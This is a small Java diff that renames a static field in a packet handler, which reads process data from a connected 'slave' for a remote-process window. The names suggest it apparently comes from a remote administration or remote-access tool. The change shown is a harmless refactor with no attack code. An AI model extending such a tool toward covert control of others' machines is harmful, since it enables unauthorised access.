@@ -16,7 +16,7 @@ public class Packet25Process extends AbstractIncomingPacket {
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		try {
-			FrameRemoteProcess frame = FrameRemoteProcess.instances.get(slave);
+			FrameRemoteProcess frame = FrameRemoteProcess.INSTANCES.get(slave);
 			FrameControlPanel framec = FrameControlPanel.instances.get(slave);
 			String line = slave.readLine();
 			String[] displayData = new String[4];
